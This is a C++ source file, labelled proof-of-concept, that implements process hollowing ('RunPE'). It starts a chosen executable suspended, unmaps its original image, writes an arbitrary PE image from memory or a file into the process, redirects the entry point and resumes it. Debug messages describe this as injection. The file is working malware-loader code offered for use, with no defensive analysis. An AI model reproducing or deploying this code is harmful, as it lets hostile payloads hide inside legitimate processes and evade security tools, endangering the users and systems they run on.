// Authors:
// Vrillon at gamedeception.net
// Galco at rohitab.com
// Proof-Of-Concept Code
// Alexey Kasyanchuk <degitx@gmail.com>


#include "creatememoryprocess.h"
#include <stdio.h>

typedef DWORD (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
NtUnmapViewOfSectionF NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"),"NtUnmapViewOfSection");

bool WINAPI CreateMemoryProcess(
								LPVOID lpImage,
								char* pPath
								)
{
	// Variables for Process Forking
	/////////////////////////////////////////////////////////////////
	DWORD                lWritten;
	DWORD                lImageSize;
	DWORD                lImageBase;
	DWORD                lImageHeaderSize;
	DWORD                lFirstSection;
	DWORD                lJumpSize = 0;
	DWORD                lSectionCount;
	DWORD                lSectionSize;
	DWORD                lPreviousProtection;

	LPVOID                  lpImageMemory;

    IMAGE_DOS_HEADER        dsDosHeader;
    IMAGE_NT_HEADERS        ntNtHeader;
    IMAGE_SECTION_HEADER    shSections[512 * 2];

    PROCESS_INFORMATION     piProcessInformation;
    STARTUPINFO             suStartUpInformation;
    CONTEXT                 cContext;
	DWORD					lProccessBaseAdress;
	DWORD					lProccessImageSize;

	char*                   pProcessName;
	bool					bIsNewProccessName = false;
	bool					bReturnValue = false;
    /////////////////////////////////////////////////////////////////
    // End Variable Definition
	
	if(strlen(pPath) == 0)
	{
		// No process name is set. Trying to fork this process
		pProcessName = new char[MAX_PATH];
		ZeroMemory(pProcessName, MAX_PATH);
		bIsNewProccessName = true;

#ifdef CPDEBUG
			printf("Trying to fork same process file\n");
#endif
		// Get the file name for the dummy process
		if(GetModuleFileName(NULL, pProcessName, MAX_PATH) == 0)
		{
#ifdef CPDEBUG
			printf("Error: Can't recive GetModuleFileName() from proccess.\n");
#endif
			delete [] pProcessName;
			return bReturnValue;
		}
	}
	else
	{
		pProcessName = pPath;
	}
    
#ifdef CPDEBUG
	printf("Using %s for injection\n", pProcessName);
#endif

    // Grab the DOS Headers
    memcpy(&dsDosHeader, lpImage, sizeof(dsDosHeader));
    if(dsDosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
#ifdef CPDEBUG
		printf("Error: File DOS header wrong\n");
#endif
		if(bIsNewProccessName)
			delete [] pProcessName;
        return false;
    }

    // Grab NT Headers
	memcpy(&ntNtHeader, (LPVOID)((DWORD)lpImage + dsDosHeader.e_lfanew), sizeof(ntNtHeader));
    if(ntNtHeader.Signature != IMAGE_NT_SIGNATURE)
    {
#ifdef CPDEBUG
		printf("Error: No NT Signature finded.\n");
#endif
		if(bIsNewProccessName)
			delete [] pProcessName;
        return false;
    }

    // Get Size and Image Base
	lImageBase = ntNtHeader.OptionalHeader.ImageBase;
	lImageSize = ntNtHeader.OptionalHeader.SizeOfImage;
    lImageHeaderSize = ntNtHeader.OptionalHeader.SizeOfHeaders;
#ifdef CPDEBUG
		printf("New image base = %X\n", lImageBase);
		printf("New image size = %d\n", lImageSize);
		printf("New image header size = %d\n", lImageHeaderSize);
#endif

    // Allocate memory for image
    lpImageMemory = new LPVOID[lImageSize];
    ZeroMemory(lpImageMemory, lImageSize);

    lFirstSection = (DWORD)(((DWORD)lpImage + dsDosHeader.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    
    memcpy(shSections, (LPVOID)(lFirstSection), sizeof(IMAGE_SECTION_HEADER) * ntNtHeader.FileHeader.NumberOfSections);
#ifdef CPDEBUG
		printf("%d header sections founded\n", ntNtHeader.FileHeader.NumberOfSections);
#endif
	memcpy(lpImageMemory, lpImage, lImageHeaderSize);

    // Get Section Alignment
    if((ntNtHeader.OptionalHeader.SizeOfHeaders % ntNtHeader.OptionalHeader.SectionAlignment) == 0)
    {
        lJumpSize = ntNtHeader.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        lJumpSize = ntNtHeader.OptionalHeader.SizeOfHeaders / ntNtHeader.OptionalHeader.SectionAlignment;
        lJumpSize += 1;
        lJumpSize *= ntNtHeader.OptionalHeader.SectionAlignment;
    }

    LPVOID lpImageMemoryDummy = (LPVOID)((DWORD)lpImageMemory + lJumpSize);

    // Copy Sections To Buffer
    for(lSectionCount = 0; lSectionCount < ntNtHeader.FileHeader.NumberOfSections; lSectionCount++)
    {
        lJumpSize = 0;
        lSectionSize = shSections[lSectionCount].SizeOfRawData;
        
        memcpy(lpImageMemoryDummy, (LPVOID)((DWORD)lpImage + shSections[lSectionCount].PointerToRawData), lSectionSize);

        if((shSections[lSectionCount].Misc.VirtualSize % ntNtHeader.OptionalHeader.SectionAlignment) == 0)
        {
            lJumpSize = shSections[lSectionCount].Misc.VirtualSize;
        }
        else
        {
            lJumpSize  = shSections[lSectionCount].Misc.VirtualSize / ntNtHeader.OptionalHeader.SectionAlignment;
            lJumpSize += 1;
            lJumpSize *= ntNtHeader.OptionalHeader.SectionAlignment;
        }

        lpImageMemoryDummy = (LPVOID)((DWORD)lpImageMemoryDummy + lJumpSize);
    }

    ZeroMemory(&suStartUpInformation, sizeof(STARTUPINFO));
    ZeroMemory(&piProcessInformation, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&cContext, sizeof(CONTEXT));

    suStartUpInformation.cb = sizeof(suStartUpInformation);

    // Create Process
    if(CreateProcess(
					NULL,
					pProcessName,
					NULL,
					NULL,
					false,
					CREATE_SUSPENDED,
					NULL,
					NULL,
					&suStartUpInformation,
					&piProcessInformation
					))
    {
#ifdef CPDEBUG
			printf("Proccess suspended\n");
#endif
        cContext.ContextFlags = CONTEXT_FULL;
		if(!GetThreadContext(piProcessInformation.hThread,&cContext))
		{
#ifdef CPDEBUG
			printf("Fail to get context of suspended proccess.\n");
#endif
			TerminateProcess(piProcessInformation.hProcess, 0);
			if(bIsNewProccessName)
				delete [] pProcessName;
            delete [] lpImageMemory;
            return false;
			return true;
		}

		DWORD *pEbxInfo = (DWORD *)cContext.Ebx;
		DWORD read;
		ReadProcessMemory(
							piProcessInformation.hProcess, 
							&pEbxInfo[2], 
							(LPVOID)&lProccessBaseAdress, 
							sizeof(DWORD), 
							&read
							);

		DWORD curAddr = lProccessBaseAdress;
		MEMORY_BASIC_INFORMATION memInfo;
		while(VirtualQueryEx(
								piProcessInformation.hProcess, 
								(LPVOID)curAddr, 
								&memInfo, 
								sizeof(memInfo))
							)
		{
			if(memInfo.State == MEM_FREE)
				break;
			curAddr += memInfo.RegionSize;
		}
		lProccessImageSize = (DWORD)curAddr - (DWORD)lProccessBaseAdress;

#ifdef CPDEBUG
		printf("Current image base adress = %X\n", lProccessBaseAdress);
		printf("Current image size = %d\n", lProccessImageSize);
#endif

        // Check image base and image size
        if(lImageBase == lProccessBaseAdress && lImageSize <= lProccessImageSize)
        {
			// we can load new image to same place
#ifdef CPDEBUG
		printf("Using same image place\n");
#endif
            VirtualProtectEx(
								piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lImageSize,
								PAGE_EXECUTE_READWRITE,
								(DWORD*)&lPreviousProtection
							);
        }
        else
        {
			// We can't use same place, allocate memory for it.
#ifdef CPDEBUG
			printf("Allocation place for new image\n");
#endif
            if(NtUnmapViewOfSection(
										piProcessInformation.hProcess,
										(LPVOID)lProccessBaseAdress
									) == 0)
			{
#ifdef CPDEBUG
					printf("Old section unmaped\n");
#endif
					LPVOID lpIsAllocated = VirtualAllocEx(
											piProcessInformation.hProcess,
											(LPVOID)lImageBase,
											lImageSize,
											MEM_COMMIT | MEM_RESERVE,
											PAGE_EXECUTE_READWRITE
									);
					if(lpIsAllocated)
					{
#ifdef CPDEBUG
						printf("Memory allocated successful\n");
#endif
					}
					else
					{
#ifdef CPDEBUG
						printf("Error: Can't allocated\n");
#endif
					}
			}
			else
			{
#ifdef CPDEBUG
				printf("Error: Can't unmap old section\n");
#endif
			}
        }

        // Write Image to Process
        if(WriteProcessMemory(
								piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lpImageMemory,
								lImageSize,
								(DWORD*)&lWritten
							))
        {
            bReturnValue = true;
#ifdef CPDEBUG
		printf("New image writen\n");
#endif
        }
		else
		{
#ifdef CPDEBUG
			printf("Error: New image written error.\n");
#endif
		}

        // Set Image Base
        if(WriteProcessMemory(
								piProcessInformation.hProcess,
								(LPVOID)((DWORD)cContext.Ebx + 8),
								&lImageBase,
								4,
								(DWORD*)&lWritten)
							)
        {
#ifdef CPDEBUG
			printf("Updated init point\n");
#endif
        }
		else
		{
			bReturnValue = false;
#ifdef CPDEBUG
			printf("Error: Can't update init point\n");
#endif
		}

        if(!bReturnValue)
        {
#ifdef CPDEBUG
			printf("Error: Error during image rewriting. Exit.\n");
#endif
			TerminateProcess(piProcessInformation.hProcess, 0);
			if(bIsNewProccessName)
				delete [] pProcessName;
            delete [] lpImageMemory;
            return false;
        }

        // Set the new entry point
        cContext.Eax = lImageBase + ntNtHeader.OptionalHeader.AddressOfEntryPoint;
        
        SetThreadContext(
						piProcessInformation.hThread,
						&cContext
						);

		if(lImageBase == lProccessBaseAdress && lImageSize <= lProccessImageSize)
		{
#ifdef CPDEBUG
			printf("Returning old protection for new image.\n");
#endif
            VirtualProtectEx(
								piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lImageSize,
								lPreviousProtection,
								0
								);
		}
        // Resume the process
        ResumeThread(piProcessInformation.hThread);
    }
	else
	{
#ifdef CPDEBUG
		printf("Error: Can't start %s\n", pProcessName);
#endif
		return false;
	}

	if(bIsNewProccessName)
		delete [] pProcessName;
    delete [] lpImageMemory;

	if(bReturnValue)
	{
#ifdef CPDEBUG
			printf("Successful injected. No errors during doing this.\n");
#endif
	}

    return bReturnValue;
}

bool WINAPI CreateMemoryProcessFromFile(char* fPath, char* fInjected)
{
		// Defenitions
		FILE*                   fFile;
		DWORD                lFileSize;
		LPVOID                  lpMemoryFile;

#ifdef CPDEBUG
		printf("Reading %s file\n", fPath);
#endif
		// Open the dummy process in binary mode
		fFile = fopen(fPath, "rb");
		if(!fFile)
		{
#ifdef CPDEBUG
			printf("Error: Can't open file\n");
#endif
			return false;
		}

		fseek(fFile, 0, SEEK_END);

		// Get file size
		lFileSize = ftell(fFile);
#ifdef CPDEBUG
		printf("File size: %d\n", lFileSize);
#endif
		rewind(fFile);

		// Allocate memory for dummy file
		lpMemoryFile = new LPVOID[lFileSize];
		ZeroMemory(lpMemoryFile, lFileSize);

		// Read memory of file
		fread(lpMemoryFile, lFileSize, 1, fFile);

		// Close file
		fclose(fFile);

#ifdef CPDEBUG
			printf("File reading done\n");
#endif

		if(CreateMemoryProcess(
										lpMemoryFile,
										fInjected
									))
		{
			delete [] lpMemoryFile;
			return true;
		}
		else
		{
			delete [] lpMemoryFile;
			return false;
		}
}

